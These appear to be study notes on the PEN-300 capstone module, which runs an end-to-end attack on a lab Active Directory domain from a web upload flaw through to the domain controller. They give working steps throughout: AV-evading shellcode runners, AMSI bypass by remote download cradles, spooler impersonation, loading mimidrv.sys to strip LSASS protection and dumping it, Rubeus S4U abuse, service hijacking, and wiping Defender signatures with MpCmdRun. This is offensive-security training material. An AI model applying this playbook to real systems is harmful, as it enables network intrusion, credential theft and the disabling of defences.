Overview

Module 22 is the capstone of PEN-300: a full end-to-end attack chain against a small hardened Active Directory lab (evil.com) that chains techniques from every earlier module. The lab estate:

  • web01 — IIS web server (192.168.120.132 in the lab excerpts), attack entry point, attacker Kali box at 192.168.119.120.
  • file01 — file server, target of constrained delegation (192.168.120.131).
  • dc02 — domain controller, final objective (192.168.120.130).

Defenses in place: Windows Defender AV, AppLocker, LSA Protection (PPL on LSASS), AMSI, and a web app that only gives a service-account foothold with no interactive logon session.

The chain, in order:

  1. Initial access — exploit a file upload flaw on web01 to get a reverse Meterpreter shell as the IIS DefaultAppPool service account, with a custom AV-evading shellcode runner.
  2. Privilege escalation — abuse the Print Spooler named-pipe impersonation bug (PrintSpoofer-style, SpoolSample trigger) to go from DefaultAppPool to local SYSTEM on web01.
  3. Credential access — defeat LSA protection with mimidrv.sys, dump LSASS with a custom MiniDumpWriteDump app, and parse the dump offline to extract the web01$ machine account NTLM hash.
  4. Kerberos abuse — use the machine account hash with Rubeus S4U (constrained delegation to file01's CIFS service) to impersonate a Domain Admin against file01.
  5. Lateral movement — pass-the-ticket to file01's service control manager: repoint the unused SensorService at a custom injector that drops shellcode into spoolsv; strip Windows Defender signatures first with MpCmdRun -RemoveDefinitions -All when the staged Meterpreter gets flagged.
  6. Domain compromise — on file01, enumerate tokens, find domain admin paul logged in, impersonate_token his delegation token, then reuse the same SensorService trick against dc02. Full compromise of evil.com without exploiting anything beyond the initial web app flaw.

Key teaching points: real engagements fail between the set pieces — the value here is how each obstacle (no logon session, PPL, AMSI, Defender network-traffic signatures, ticket loss over reverse shells) forces an improvisation rather than a textbook command.

Key Sections & Techniques

1. Initial Access: Web Shell to Meterpreter (web01)

  • Upload folder at C:\inetpub\wwwroot\Upload on web01; initial shell lands as the IIS app-pool identity.
  • The shellcode runner is the custom C# AV bypass version from the earlier AV-evasion module: non-emulated API checks (VirtualAllocExNuma probe) plus a Caesar cipher (shift −5, ((uint)buf[i] - 5) & 0xFF) over the shellcode so Windows Defender's static signatures don't fire.
  • AMSI is disabled via a download cradle: (New-Object System.Net.WebClient).DownloadString('http://KALI/amsi.txt') | IEX before any in-memory PowerShell tooling (mimikatz.txt, Rubeus) is pulled down.
  • Attacker Kali web root hosts the staged payloads (amsi.txt, mimikatz.txt, Rubeus.exe, binaries); the multi/handler listens on HTTPS 443.

2. Privilege Escalation: Spooler Impersonation to SYSTEM

  • The app-pool account has SeImpersonatePrivilege but no interactive logon session, which breaks naive CreateProcessWithTokenW usage and motivates the SpoolSample/PrintSpoofer approach: coerce the SYSTEM print spooler to authenticate to an attacker-controlled named pipe and impersonate it.
  • The module re-implements the spoofer in C# (PrintSpooferNet): create pipe \\.\pipe\test\pipe\spoolss, ImpersonateNamedPipeClient, find the S-1-5-18 SID, then spawn the payload with CreateProcessWithTokenW.
  • Three gotchas the module calls out explicitly:
  • Call RevertToSelf() first — some SYSTEM processes have lost SeImpersonatePrivilege, so revert to the app-pool token before creating the process.
  • Set dwLogonFlags = LogonFlags.WithProfile and dwCreationFlags = CreationFlags.UnicodeEnvironment (the environment block built earlier is Unicode; without the profile flag some registry usage fails).
  • Set si.lpDesktop = "WinSta0\\Default" — a logon session would get a desktop automatically, but here it must be set explicitly or the child process fails.
  • Execution flow: run printspoofernet.exe \\.\pipe\test\pipe\spoolss from the web shell, background the channel, then in a second shell run SpoolSample.exe web01 web01/pipe/test; the spooler connects back and a new Meterpreter session opens as NT AUTHORITY\SYSTEM.

3. Credential Access: Beating PPL for the Machine Account Hash

The constrained delegation attack needs the web01$ machine account NTLM hash out of LSASS, but LSA protection (PPL) blocks injection/dump. Since a kernel driver must live on disk and be signed, and Defender doesn't flag mimidrv.sys itself, the module's play is to minimize Mimikatz usage to exactly one short-lived execution:

  1. Migrate the SYSTEM Meterpreter into spoolsv for stability (migrate <pid of spoolsv>), then open a shell.
  2. Manually load the driver without Mimikatz: sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= demand sc start mimidrv
  3. Disable AMSI, then run one Invoke-Mimikatz command to strip the PPL flag: Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`"" (nested backtick-escaped quotes because -Command needs both levels of quoting). Defender kills the PowerShell process right after — expected; the PPL flag is already off.
  4. Dump LSASS with the custom dump.exe app that calls MiniDumpWriteDump, writing lsass.dmp (~46 MB) to C:\Windows\Tasks.
  5. Parse offline: download the dump to Kali, serve it, pull it onto the clean Windows 2019 test machine, and run: Invoke-Mimikatz -Command "`"sekurlsa::minidump C:\tools\lsass.dmp`" sekurlsa::logonpasswords" yielding e.g. WEB01$ / EVIL / NTLM: <hash> — the machine account hash.

4. Kerberos Abuse: Constrained Delegation via Rubeus S4U

  • web01 is configured for constrained delegation to cifs/file01, so the web01$ hash can request a TGS as any user for that SPN. Impersonating a Domain Admin gives code-exec rights on file01.
  • Compile Rubeus targeting .NET Framework 4.6 (what Server 2019 ships). Don't drop the binary on disk — stock Rubeus is heavily signatured; load it from memory after the AMSI bypass: $data = (New-Object System.Net.WebClient).DownloadData('http://KALI/Rubeus.exe') $assem = [System.Reflection.Assembly]::Load($data)
  • Invoke functionality through the public Main — e.g. [Rubeus.Program]::Main("purge".Split()) clears tickets.
  • The S4U chain, one call, pass-the-ticket: Flow: AS-REQ for web01$ TGT → S4U2self gets a forwardable TGS for administrator to web01$ → S4U2proxy exchanges it for a cifs/file01 TGS → /ptt injects it.
  • Verify with klist (Client: administrator @ EVIL.COM / Server: cifs/file01), then ls \\file01\c$ proves Domain-Admin-level CIFS access.
  • Lab gotcha: through a reverse shell the injected TGS is occasionally lost — just request it again.

5. Lateral Movement: SensorService Hijack + Defender Signature Purge

Pass-the-ticket, not pass-the-hash: the TGS is what's usable, and Metasploit PsExec-style modules either can't use it or trip Defender. The technique repurposes the unused SensorService on the target:

  1. inject.exe — C# app combining the AV-bypass shellcode runner (Numa probe + Caesar shift) with classic process injection targeted at spoolsv (a non-PPL SYSTEM process on Server 2019): VirtualAllocEx → WriteProcessMemory → CreateRemoteThread. Injecting rather than being a proper service binary means the shell survives the SCM's 1053 timeout kill.
  2. lat.exe — modifies the service remotely over the CIFS TGS: OpenSCManager("file01", null, 0xF003F); OpenService(..., "SensorService", 0xF01FF); ChangeServiceConfigA(schService, ..., "C:\\inject.exe", ...); StartService(schService, 0, null); Error in calling StartService: 1053 is expected (not a real service executable).
  3. First attempt fails: the staged Meterpreter session opens then hangs — Defender's Network Realtime Inspection (WdNisSvc) matches the staging traffic signatures inside spoolsv and kills it. Brute-forcing payloads would poison the attack: spoolsv only auto-restarts twice, and repeated SensorService/spoolsv interaction makes Defender disable SensorService and mark it for deletion. Killing MsMpEng is out — it's PPL-protected even for SYSTEM.
  4. The fix: abuse Defender's own MpCmdRun CLI. Point SensorService at the signature-removal command first, let it time out, then repoint at inject.exe: string signature = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All"; ChangeServiceConfigA(..., signature, ...); StartService(...); ChangeServiceConfigA(..., payload, ...); // C:\inject.exe StartService(...); With zero signature definitions, the second start lands a clean SYSTEM Meterpreter on file01. (Defender will re-download definitions over time — purge periodically for persistent access.)
  5. Confirm with sysinfo (Computer: FILE01, NT AUTHORITY\SYSTEM).

6. Domain Compromise: Token Impersonation → DC

  • On file01, enumeration shows the same defenses as web01 but ps reveals domain user paul with live processes (explorer.exe, ServerManager.exe) — an interactive domain-admin session to hijack.
  • net user paul /domain confirms *Domain Admins membership.
  • Rather than re-defeating PPL to dump paul's hash (or migrating into his medium-integrity process and hitting UAC/AppLocker), impersonate his token as SYSTEM: load incognito list_tokens -u # delegation tokens include EVIL\paul impersonate_token EVIL\\paul
  • Then rerun the same lateral-movement play (now lat2.exe targeting dc02), uploaded to file01, with paul's impersonated token supplying the rights: copy c:\inject.exe \\dc02\c$ then c:\lat2.exe → third SYSTEM Meterpreter session on DC02.
  • Endgame: dump everything including krbtgt (DCSync or otherwise) to retain domain access.

Gotchas & Lessons

  • No interactive logon session for the service-account foothold is the defining constraint of the whole module — it drives the desktop/RevertToSelf fixes in the spoofer and pushes toward machine-account rather than user credential attacks.
  • One-shot Mimikatz: load mimidrv.sys via sc by hand first, run only the PPL-strip command in memory, then do the actual LSASS dump with your own MiniDumpWriteDump binary and parse it offline — accepts one AV alert instead of a prolonged fight.
  • Nested quoting for Invoke-Mimikatz -Command: outer double quotes plus backtick-escaped inner quotes.
  • Ticket loss over reverse shells: TGS injected with /ptt can vanish between channels; re-request rather than debug.
  • Meterpreter session opens then hangs = shellcode architecture mismatch or AV network-traffic detection — diagnose before re-throwing.
  • Service-based AV evasion logic: don't attack MsMpEng (PPL); don't brute-force payloads (burns spoolsv restarts and gets SensorService marked for deletion); instead abuse the AV's own maintenance tooling (MpCmdRun -RemoveDefinitions -All) through the very service you're hijacking.
  • Cleanup: the attack scatters binaries, drivers, and dumps across three boxes — track and remove artifacts at engagement end.

Exercises (as given in the module)

  • Modify PrintSpooferNet to work from a shell with a logon session; transfer files, prep the listener + two command prompts, execute the attack to SYSTEM.
  • Download the correct mimidrv.sys / Invoke-Mimikatz to the Kali web root; migrate the SYSTEM shell; launch the driver via SCM; disable AMSI, strip LSASS PPL; dump LSASS with the custom app; extract the web01$ NTLM hash offline.
  • Rework Rubeus for .NET 4.6; disable AMSI from the SYSTEM shell and load Rubeus in memory; request the cifs/file01 TGS as administrator; verify share access.
  • Combine process injection with the AV bypass; wire up the SensorService lateral movement; attempt it with a raw Meterpreter payload and observe the AV catch; adapt with MpCmdRun definition removal; land a clean shell on file01.
  • List tokens and impersonate EVIL\paul; while impersonating, move laterally to dc02.
  • Extra mile: repeat the whole chain from a different C2 framework (PowerShell Empire or Covenant) where AV evasion may be easier due to absent signatures/behavioral detections.
